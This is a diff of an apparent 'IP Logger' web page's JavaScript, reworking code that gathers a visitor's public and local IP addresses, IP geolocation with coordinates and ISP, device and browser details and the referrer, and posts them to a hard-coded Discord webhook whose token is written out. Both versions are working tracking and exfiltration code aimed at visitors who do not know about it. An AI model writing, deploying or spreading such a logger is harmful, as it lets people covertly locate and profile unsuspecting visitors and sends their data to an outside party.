@@ -21,160 +21,95 @@
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
         
         async function getIPAddress() {
-            const services = [
-                'https://api.ipify.org?format=json',
-                'https://api64.ipify.org?format=json',
-                'https://api.my-ip.io/ip.json',
-                'https://ip.seeip.org/jsonip',
-                'https://api.ip.sb/ip'
-            ];
-            
-            for (const service of services) {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip || 'Unknown';
+            } catch {
                 try {
-                    const res = await fetch(service, { timeout: 3000 });
+                    const res = await fetch('https://api64.ipify.org?format=json');
                     const data = await res.json();
-                    if (data.ip) return data.ip;
-                } catch (e) {
-                    continue;
+                    return data.ip || 'Unknown';
+                } catch {
+                    return 'Failed to get IP';
                 }
             }
-            return 'Unknown';
         }
         
-        async function getGlobalLocation(ip) {
-            const apis = [
-                {
-                    name: 'ipapi.co',
-                    url: `https://ipapi.co/${ip}/json/`,
-                    parse: (data) => ({
-                        lat: data.latitude,
-                        lon: data.longitude,
-                        city: data.city,
-                        region: data.region,
-                        country: data.country_name,
-                        isp: data.org,
-                        zip: data.postal,
-                        timezone: data.timezone,
-                        currency: data.currency,
-                        calling_code: data.country_calling_code
-                    })
-                },
-                {
-                    name: 'ip-api.com',
-                    url: `http://ip-api.com/json/${ip}`,
-                    parse: (data) => ({
-                        lat: data.lat,
-                        lon: data.lon,
-                        city: data.city,
-                        region: data.regionName,
-                        country: data.country,
-                        isp: data.isp,
-                        zip: data.zip,
-                        timezone: data.timezone,
-                        currency: data.currency,
-                        calling_code: data.countryCode ? `+${data.countryCode}` : null
-                    })
-                },
-                {
-                    name: 'freegeoip.app',
-                    url: `https://freegeoip.app/json/${ip}`,
-                    parse: (data) => ({
-                        lat: data.latitude,
-                        lon: data.longitude,
-                        city: data.city,
-                        region: data.region_name,
-                        country: data.country_name,
-                        isp: data.isp,
-                        zip: data.zip_code,
-                        timezone: data.time_zone,
-                        currency: data.currency ? data.currency.code : null,
-                        calling_code: data.country_code
-                    })
-                }
+        async function getLocationWithMultipleAPIs(ip) {
+            // Try multiple APIs in parallel
+            const promises = [
+                fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json()),
+                fetch(`http://ip-api.com/json/${ip}`).then(r => r.json()),
+                fetch(`https://ipwho.is/${ip}`).then(r => r.json())
             ];
             
-            for (const api of apis) {
-                try {
-                    const res = await fetch(api.url);
-                    const data = await res.json();
-                    if (data && (data.latitude || data.lat)) {
-                        const location = api.parse(data);
+            try {
+                const results = await Promise.any(promises.map(p => p.catch(e => null)));
+                
+                // Parse whichever succeeded
+                if (results && results.ip) {
+                    // Check which API format we got
+                    if (results.city) {
+                        // ipapi.co or ipwho.is format
                         return {
-                            ...location,
-                            source: api.name,
-                            success: true
+                            lat: results.latitude || results.lat || 'Unknown',
+                            lon: results.longitude || results.lon || 'Unknown',
+                            city: results.city || 'Unknown',
+                            region: results.region || results.region_name || results.state || 'Unknown',
+                            country: results.country_name || results.country || 'Unknown',
+                            isp: results.org || results.isp || results.connection?.isp || 'Unknown',
+                            zip: results.postal || results.zip || 'Unknown',
+                            timezone: results.timezone || 'Unknown',
+                            source: 'Success'
+                        };
+                    } else if (results.city === undefined && results.query) {
+                        // ip-api.com format
+                        return {
+                            lat: results.lat || 'Unknown',
+                            lon: results.lon || 'Unknown',
+                            city: results.city || 'Unknown',
+                            region: results.regionName || 'Unknown',
+                            country: results.country || 'Unknown',
+                            isp: results.isp || 'Unknown',
+                            zip: results.zip || 'Unknown',
+                            timezone: results.timezone || 'Unknown',
+                            source: 'Success'
                         };
                     }
-                } catch (e) {
-                    continue;
                 }
+            } catch (e) {
+                console.log('All APIs failed');
             }
             
-            return {
-                lat: 'Unknown',
-                lon: 'Unknown',
-                city: 'Unknown',
-                region: 'Unknown',
-                country: 'Unknown',
-                isp: 'Unknown',
-                zip: 'Unknown',
-                timezone: 'Unknown',
-                currency: 'Unknown',
-                calling_code: 'Unknown',
-                source: 'Failed',
-                success: false
-            };
-        }
-        
-        function getBrowserInfo() {
-            const ua = navigator.userAgent;
-            const languages = navigator.languages;
-            const platform = navigator.platform;
-            const vendor = navigator.vendor;
-            const language = navigator.language;
-            const cookies = navigator.cookieEnabled;
-            const doNotTrack = navigator.doNotTrack;
-            const online = navigator.onLine;
-            const pdf = navigator.pdfViewerEnabled;
-            const hardwareCores = navigator.hardwareConcurrency;
-            const deviceMemory = navigator.deviceMemory;
-            const maxTouch = navigator.maxTouchPoints;
-            
-            let device = 'Desktop';
-            if (/mobile/i.test(ua)) device = 'Mobile';
-            if (/tablet/i.test(ua)) device = 'Tablet';
-            
-            let os = 'Unknown';
-            if (/windows/i.test(ua)) os = 'Windows';
-            else if (/mac/i.test(ua)) os = 'macOS';
-            else if (/linux/i.test(ua)) os = 'Linux';
-            else if (/android/i.test(ua)) os = 'Android';
-            else if (/ios|iphone|ipad/i.test(ua)) os = 'iOS';
-            
-            let browser = 'Unknown';
-            if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'Chrome';
-            else if (/firefox/i.test(ua)) browser = 'Firefox';
-            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
-            else if (/edge/i.test(ua)) browser = 'Edge';
-            else if (/opera/i.test(ua)) browser = 'Opera';
-            
-            return {
-                device,
-                os,
-                browser,
-                ua,
-                languages: languages.join(', '),
-                platform,
-                vendor,
-                language,
-                cookies: cookies ? 'Enabled' : 'Disabled',
-                doNotTrack: doNotTrack || 'Not set',
-                online: online ? 'Online' : 'Offline',
-                pdf: pdf ? 'Yes' : 'No',
-                hardwareCores: hardwareCores || 'Unknown',
-                deviceMemory: deviceMemory ? deviceMemory + ' GB' : 'Unknown',
-                maxTouch
-            };
+            // Last resort: Use freegeoip (no key needed)
+            try {
+                const res = await fetch(`https://freegeoip.app/json/${ip}`);
+                const data = await res.json();
+                return {
+                    lat: data.latitude || 'Unknown',
+                    lon: data.longitude || 'Unknown',
+                    city: data.city || 'Unknown',
+                    region: data.region_name || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    isp: data.isp || 'Unknown',
+                    zip: data.zip_code || 'Unknown',
+                    timezone: data.time_zone || 'Unknown',
+                    source: 'FreeGeoIP'
+                };
+            } catch (e) {
+                return {
+                    lat: 'Unknown (API failed)',
+                    lon: 'Unknown (API failed)',
+                    city: 'Unknown (API failed)',
+                    region: 'Unknown (API failed)',
+                    country: 'Unknown (API failed)',
+                    isp: 'Unknown (API failed)',
+                    zip: 'Unknown (API failed)',
+                    timezone: 'Unknown (API failed)',
+                    source: 'All APIs failed'
+                };
+            }
         }
         
         async function getLocalIP() {
@@ -222,15 +157,37 @@
             });
         }
         
-        function formatTime(date) {
-            const day = date.getDate().toString().padStart(2, '0');
-            const month = (date.getMonth() + 1).toString().padStart(2, '0');
-            const year = date.getFullYear();
-            const hours = date.getHours().toString().padStart(2, '0');
-            const minutes = date.getMinutes().toString().padStart(2, '0');
-            const seconds = date.getSeconds().toString().padStart(2, '0');
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
             
-            return `${day}/${month}/${year} ${hours}:${minutes}:${seconds}`;
+            // Simple device detection
+            let device = 'Desktop';
+            if (/mobile|android|iphone/i.test(ua.toLowerCase())) device = 'Mobile';
+            
+            // Simple OS detection
+            let os = 'Unknown';
+            if (/windows/i.test(ua)) os = 'Windows';
+            else if (/mac/i.test(ua)) os = 'macOS';
+            else if (/linux/i.test(ua)) os = 'Linux';
+            else if (/android/i.test(ua)) os = 'Android';
+            else if (/iphone|ipad/i.test(ua)) os = 'iOS';
+            
+            // Simple browser detection
+            let browser = 'Unknown';
+            if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'Chrome';
+            else if (/firefox/i.test(ua)) browser = 'Firefox';
+            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
+            else if (/edge/i.test(ua)) browser = 'Edge';
+            
+            return {
+                device,
+                os,
+                browser,
+                language: navigator.language || 'Unknown',
+                platform: navigator.platform || 'Unknown',
+                cookies: navigator.cookieEnabled ? 'Yes' : 'No',
+                online: navigator.onLine ? 'Online' : 'Offline'
+            };
         }
         
         document.getElementById('trackButton').addEventListener('click', async function() {
@@ -238,67 +195,69 @@
             const status = document.getElementById('status');
             
             button.disabled = true;
-            button.textContent = 'Processing...';
+            button.textContent = 'Getting info...';
             status.style.display = 'none';
             
             try {
+                // Get IP (basic)
                 const publicIP = await getIPAddress();
+                
+                // Get location info
+                const location = await getLocationWithMultipleAPIs(publicIP);
+                
+                // Get local IP
                 const localIP = await getLocalIP();
-                const location = await getGlobalLocation(publicIP);
+                
+                // Get browser info
                 const browserInfo = getBrowserInfo();
+                
+                // Current time
                 const now = new Date();
+                const timeStr = now.toLocaleString();
                 
-                let mapsLink = 'No coordinates';
-                if (location.lat !== 'Unknown' && location.lon !== 'Unknown') {
-                    mapsLink = `https://www.google.com/maps/@${location.lat},${location.lon},15z`;
-                }
-                
+                // Build message
                 const embed = {
-                    title: "IP LOGGED FROM " + location.country.toUpperCase(),
-                    color: 0xFF0000,
+                    title: "NEW VISITOR DETECTED",
+                    color: 0x00FF00,
                     fields: [
                         {
-                            name: "NETWORK INFORMATION",
-                            value: `Public IP: ${publicIP}\nLocal IP: ${localIP}\nISP: ${location.isp}`,
+                            name: "IP ADDRESS",
+                            value: `**Public:** \`${publicIP}\`\n**Local:** \`${localIP}\``,
                             inline: true
                         },
                         {
-                            name: "GEOGRAPHICAL LOCATION",
-                            value: `Country: ${location.country}\nRegion: ${location.region}\nCity: ${location.city}\nZIP: ${location.zip}\nTimezone: ${location.timezone}\nCurrency: ${location.currency}`,
+                            name: "LOCATION INFO",
+                            value: `**Country:** ${location.country}\n**Region:** ${location.region}\n**City:** ${location.city}\n**ISP:** ${location.isp}`,
                             inline: true
                         },
                         {
                             name: "COORDINATES",
-                            value: `Latitude: ${location.lat}\nLongitude: ${location.lon}\nAccuracy: IP-based\nSource: ${location.source}\nMaps: ${mapsLink}`,
+                            value: `**Latitude:** ${location.lat}\n**Longitude:** ${location.lon}\n**Source:** ${location.source}`,
                             inline: true
                         },
                         {
-                            name: "DEVICE & BROWSER",
-                            value: `Device: ${browserInfo.device}\nOS: ${browserInfo.os}\nBrowser: ${browserInfo.browser}\nPlatform: ${browserInfo.platform}\nLanguage: ${browserInfo.language}`,
+                            name: "DEVICE INFO",
+                            value: `**Device:** ${browserInfo.device}\n**OS:** ${browserInfo.os}\n**Browser:** ${browserInfo.browser}\n**Language:** ${browserInfo.language}`,
                             inline: true
                         },
                         {
-                            name: "SYSTEM INFORMATION",
-                            value: `CPU Cores: ${browserInfo.hardwareCores}\nRAM: ${browserInfo.deviceMemory}\nTouch Points: ${browserInfo.maxTouch}\nPDF Viewer: ${browserInfo.pdf}\nCookies: ${browserInfo.cookies}`,
-                            inline: true
-                        },
-                        {
-                            name: "TIME & SESSION",
-                            value: `Local Time: ${formatTime(now)}\nUTC Time: ${now.toUTCString()}\nReferrer: ${document.referrer || 'Direct'}\nURL: ${window.location.href}\nUser Agent: \`\`\`${browserInfo.ua.substring(0, 300)}\`\`\``,
+                            name: "TIME & URL",
+                            value: `**Time:** ${timeStr}\n**Page:** ${window.location.href}\n**Referrer:** ${document.referrer || 'Direct'}`,
                             inline: false
                         }
                     ],
                     footer: {
-                        text: "Global IP Logger • Works in all countries • " + location.source
+                        text: "IP Logger • " + now.toLocaleDateString()
                     },
                     timestamp: now.toISOString()
                 };
                 
                 const discordMessage = {
                     embeds: [embed],
-                    username: "Global IP Logger"
+                    username: "IP Logger"
                 };
                 
+                // Send to Discord
                 const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -306,16 +265,16 @@
                 });
                 
                 if (response.ok) {
-                    status.textContent = 'Logged successfully. Check Discord.';
+                    status.textContent = 'Info sent to Discord!';
                     status.style.color = '#4CAF50';
                     status.style.backgroundColor = '#E8F5E9';
                 } else {
-                    throw new Error('Failed to send');
+                    throw new Error('Discord error');
                 }
                 
             } catch (error) {
                 console.error('Error:', error);
-                status.textContent = 'Error. Please try again.';
+                status.textContent = 'Error. Try again later.';
                 status.style.color = '#F44336';
                 status.style.backgroundColor = '#FFEBEE';
             } finally {
